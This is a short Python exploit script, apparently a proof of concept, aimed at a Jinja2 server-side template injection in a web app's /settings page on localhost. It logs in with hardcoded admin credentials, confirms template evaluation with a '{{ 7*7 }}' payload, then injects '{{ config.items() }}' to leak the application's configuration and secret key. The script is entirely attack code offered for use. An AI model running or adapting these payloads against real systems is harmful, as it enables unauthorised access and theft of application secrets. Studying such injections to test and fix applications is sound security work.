import requests

URL = "http://localhost:8080/settings"

def exploit_ssti():
    print("[*] Exploiting Jinja2 SSTI on /settings...")
    
    session = requests.Session()
    print("[*] Logging in to get session...")
    session.post("http://localhost:8080/login", data={"username": "admin", "password": "admin123"})
    
    # Payload to multiply 7*7
    payload = "{{ 7*7 }}"
    
    response = session.get(URL, params={"theme": payload})
    
    if "7*7" not in response.text and "49" in response.text:
        print("[+] Success! SSTI payload executed. Found '49' in response.")
        
        # More advanced payload to reveal secrets
        print("[*] Attempting to leak app config...")
        config_payload = "{{ config.items() }}"
        response = requests.get(URL, params={"theme": config_payload})
        if "secret_key" in response.text or "dict_items" in response.text:
            print("[+] Success! Leaked application configuration.")
    else:
        print("[-] SSTI failed.")

if __name__ == "__main__":
    exploit_ssti()
